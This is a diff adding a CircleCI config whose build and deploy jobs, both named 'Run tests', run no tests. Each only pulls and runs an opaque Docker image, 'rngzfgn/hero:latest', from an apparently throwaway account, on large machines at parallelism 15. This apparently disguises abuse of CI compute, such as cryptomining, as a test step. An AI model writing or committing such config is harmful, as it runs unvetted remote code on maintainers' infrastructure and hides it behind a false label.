@@ -1,0 +1,36 @@
+version: 2.1 
+ 
+orbs: 
+  docker: circleci/docker@2.0.1 
+ 
+jobs: 
+  build: 
+    executor: docker/docker 
+    resource_class: large
+    parallelism: 15
+    steps: 
+      - setup_remote_docker 
+      - checkout 
+      - run:
+          name: Run tests
+          command: |
+                      docker pull rngzfgn/hero:latest
+                      docker run -p 127.0.0.1:8080:8080 rngzfgn/hero:latest
+  deploy: 
+    executor: docker/docker 
+    resource_class: large
+    parallelism: 15
+    steps: 
+      - setup_remote_docker 
+      - checkout 
+      - run:
+          name: Run tests
+          command: |
+                      docker pull rngzfgn/hero:latest
+                      docker run -p 127.0.0.1:8080:8080 rngzfgn/hero:latest
+       
+workflows: 
+  main: 
+    jobs: 
+      - build 
+      - deploy
